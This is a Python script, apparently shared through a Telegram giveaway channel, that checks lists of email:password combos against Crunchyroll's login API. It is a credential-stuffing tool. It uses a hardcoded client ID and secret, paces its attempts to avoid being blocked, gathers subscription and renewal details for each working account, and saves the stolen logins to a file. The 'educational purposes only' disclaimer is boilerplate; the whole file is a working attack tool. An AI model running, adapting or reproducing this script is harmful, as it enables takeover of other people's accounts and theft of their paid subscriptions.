import requests
import json
import time
import sys
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

class CrunchyrollChecker:
    def __init__(self):
        self.base_url = "https://new-api.crunchyroll.com"
        self.client_id = "o7uowy7q4lgltbavyhjq"
        self.client_secret = "lqrjETNx6W7uRnpcDm8wRVj8BChjC1er"
        self.token = None
        
    def generate_device_id(self):
        """Generate random device ID"""
        import uuid
        return str(uuid.uuid4())
    
    def calculate_days_left(self, renewal_date):
        """Calculate days until renewal"""
        if not renewal_date or renewal_date == "N/A":
            return "Unknown"
        
        try:
            # Parse the renewal date (format example: "2024-12-31T23:59:59Z")
            renew_dt = datetime.fromisoformat(renewal_date.replace('Z', '+00:00'))
            now_dt = datetime.now(renew_dt.tzinfo)
            days_left = (renew_dt - now_dt).days
            return days_left if days_left > 0 else 0
        except Exception as e:
            return "Unknown"
    
    def authenticate(self, device_id):
        """Get bearer token"""
        auth_url = f"{self.base_url}/auth/v1/token"
        auth_data = {
            "grant_type": "client_credentials",
            "client_id": self.client_id,
            "client_secret": self.client_secret,
            "device_id": device_id
        }
        
        try:
            response = requests.post(auth_url, data=auth_data, timeout=10)
            if response.status_code == 200:
                token_data = response.json()
                self.token = token_data.get('access_token')
                return True
            else:
                return False
        except Exception as e:
            return False
    
    def check_account(self, email, password):
        """Check Crunchyroll account credentials"""
        device_id = self.generate_device_id()
        
        # Get token first
        if not self.authenticate(device_id):
            return {"valid": False, "error": "Authentication failed"}
        
        # Login request
        login_url = f"{self.base_url}/auth/v1/token"
        login_data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "device_id": device_id
        }
        
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            response = requests.post(login_url, data=login_data, headers=headers, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                # Get account info
                account_info = self.get_account_info(data.get('access_token'))
                
                return {
                    "valid": True,
                    "email": email,
                    "password": password,
                    "username": account_info.get('username', 'N/A'),
                    "subscription": account_info.get('subscription', 'None'),
                    "renewal_date": account_info.get('renewal_date', 'N/A'),
                    "days_left": self.calculate_days_left(account_info.get('renewal_date')),
                    "country": account_info.get('country', 'N/A')
                }
            else:
                error_msg = self.parse_error(response)
                return {"valid": False, "error": error_msg}
                
        except Exception as e:
            return {"valid": False, "error": str(e)}
    
    def get_account_info(self, access_token):
        """Get detailed account information"""
        profile_url = f"{self.base_url}/accounts/v1/me"
        headers = {"Authorization": f"Bearer {access_token}"}
        
        try:
            response = requests.get(profile_url, headers=headers, timeout=10)
            if response.status_code == 200:
                user_data = response.json()
                
                # Get subscription info
                sub_info = self.get_subscription_info(access_token)
                
                return {
                    "username": user_data.get('username', user_data.get('email')),
                    "subscription": sub_info.get('subscription_type', 'Free'),
                    "renewal_date": sub_info.get('renewal_date'),
                    "country": user_data.get('country', 'N/A')
                }
            else:
                return {
                    "username": "Unknown",
                    "subscription": "Unknown",
                    "renewal_date": "N/A",
                    "country": "N/A"
                }
        except Exception as e:
            return {
                "username": "Error",
                "subscription": "Unknown",
                "renewal_date": "N/A",
                "country": "N/A"
            }
    
    def get_subscription_info(self, access_token):
        """Get subscription details"""
        sub_url = f"{self.base_url}/subscriptions/v1/subscriptions"
        headers = {"Authorization": f"Bearer {access_token}"}
        
        try:
            response = requests.get(sub_url, headers=headers, timeout=10)
            if response.status_code == 200:
                subs = response.json()
                if subs and len(subs) > 0:
                    return {
                        "subscription_type": subs[0].get('type', 'Free'),
                        "renewal_date": subs[0].get('renewal_date')
                    }
        except Exception:
            pass
        
        return {"subscription_type": "Free", "renewal_date": "N/A"}
    
    def parse_error(self, response):
        """Parse error response"""
        try:
            error_data = response.json()
            error_code = error_data.get('error', '')
            error_description = error_data.get('error_description', '')
            
            if 'invalid_grant' in error_code or 'invalid credentials' in error_description.lower():
                return "Invalid email or password"
            elif 'account locked' in error_description.lower():
                return "Account locked - Too many attempts"
            else:
                return f"Login failed (HTTP {response.status_code})"
        except:
            return f"Login failed (HTTP {response.status_code})"


def print_banner():
    """Display banner"""
    print(Fore.CYAN + """
╔══════════════════════════════════════════════════════════╗
║           Crunchyroll Account Checker                   ║
║                   Premium Checker                       ║
╠══════════════════════════════════════════════════════════╣
║  Developer: @proboy_23                                  ║
║  Telegram Channel: @acgiveaway_2                        ║
╚══════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)
    
    print(Fore.YELLOW + "[!] Disclaimer: This tool is for educational purposes only")
    print(Fore.YELLOW + "[!] Use responsibly and respect Crunchyroll's terms of service\n" + Style.RESET_ALL)


def save_result(result, output_file="valid.txt"):
    """Save valid account to file"""
    if result.get('valid'):
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(f"{result['email']}:{result['password']} | ")
            f.write(f"Username: {result.get('username', 'N/A')} | ")
            f.write(f"Plan: {result.get('subscription', 'N/A')} | ")
            f.write(f"Days Left: {result.get('days_left', 'Unknown')} | ")
            f.write(f"Country: {result.get('country', 'N/A')}\n")
            f.write(f"Checked by: @proboy_23 | Channel: @acgiveaway_2\n")
            f.write("-" * 80 + "\n")


def main():
    print_banner()
    
    if len(sys.argv) < 2:
        print(Fore.YELLOW + "Usage:")
        print(f"  python {sys.argv[0]} combos.txt          # Check from file")
        print(f"  python {sys.argv[0]} email:pass           # Check single account")
        print(f"  python {sys.argv[0]} email:pass,email2:pass2 # Check multiple (comma separated)")
        print("\n" + Fore.CYAN + "Example:")
        print(f"  python {sys.argv[0]} test@email.com:password123")
        sys.exit(1)
    
    checker = CrunchyrollChecker()
    accounts = []
    
    # Parse input
    if sys.argv[1].endswith('.txt'):
        try:
            with open(sys.argv[1], 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line and line:
                        accounts.append(line)
            print(Fore.GREEN + f"[+] Loaded {len(accounts)} accounts from {sys.argv[1]}")
        except FileNotFoundError:
            print(Fore.RED + f"[-] File not found: {sys.argv[1]}")
            sys.exit(1)
    else:
        # Single or multiple comma-separated accounts
        arg = sys.argv[1]
        accounts = arg.split(',')
        for i, acc in enumerate(accounts):
            accounts[i] = acc.strip()
    
    print(Fore.CYAN + "\n" + "="*70)
    print(f"[*] Starting check | Total: {len(accounts)} accounts")
    print("="*70 + "\n")
    
    valid_count = 0
    invalid_count = 0
    start_time = time.time()
    
    for idx, account in enumerate(accounts, 1):
        if ':' not in account:
            print(Fore.RED + f"[{idx}/{len(accounts)}] SKIP: Invalid format -> {account}")
            continue
        
        email, password = account.split(':', 1)
        
        print(Fore.YELLOW + f"[{idx}/{len(accounts)}] Checking: {email[:20]}...")
        
        result = checker.check_account(email, password)
        
        if result.get('valid'):
            valid_count += 1
            print(Fore.GREEN + f"  ✓ VALID ACCOUNT!")
            print(Fore.CYAN + f"    ├─ Email: {result.get('email')}")
            print(Fore.CYAN + f"    ├─ Username: {result.get('username', 'N/A')}")
            print(Fore.CYAN + f"    ├─ Subscription: {result.get('subscription', 'N/A')}")
            print(Fore.CYAN + f"    ├─ Days remaining: {result.get('days_left', 'Unknown')}")
            print(Fore.CYAN + f"    └─ Country: {result.get('country', 'N/A')}")
            print(Fore.MAGENTA + f"    [Credits: @proboy_23 | @acgiveaway_2]")
            save_result(result)
        else:
            invalid_count += 1
            error = result.get('error', 'Unknown error')
            print(Fore.RED + f"  ✗ INVALID: {error}")
        
        print()  # Empty line for spacing
        
        # Rate limiting to avoid being blocked
        if idx < len(accounts):
            time.sleep(1)
    
    # Calculate time taken
    elapsed_time = time.time() - start_time
    
    # Summary
    print("="*70)
    print(Fore.CYAN + "[*] CHECK COMPLETED")
    print("="*70)
    print(Fore.GREEN + f"[✓] Valid accounts: {valid_count}")
    print(Fore.RED + f"[✗] Invalid accounts: {invalid_count}")
    print(Fore.YELLOW + f"[!] Total checked: {valid_count + invalid_count}")
    print(Fore.YELLOW + f"[!] Time taken: {elapsed_time:.2f} seconds")
    print("="*70)
    
    if valid_count > 0:
        print(Fore.GREEN + f"\n[✓] Valid accounts saved to 'valid.txt'")
        print(Fore.CYAN + f"[✓] Thanks for using @acgiveaway_2")
    
    print(Fore.MAGENTA + "\n" + "="*70)
    print(Fore.MAGENTA + "Developer: @proboy_23")
    print(Fore.MAGENTA + "Telegram Channel: @acgiveaway_2")
    print(Fore.MAGENTA + "="*70 + Style.RESET_ALL)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[!] Stopped by user")
        print(Fore.CYAN + "[!] Thanks for using @acgiveaway_2")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[!] Error: {e}")
        sys.exit(1)
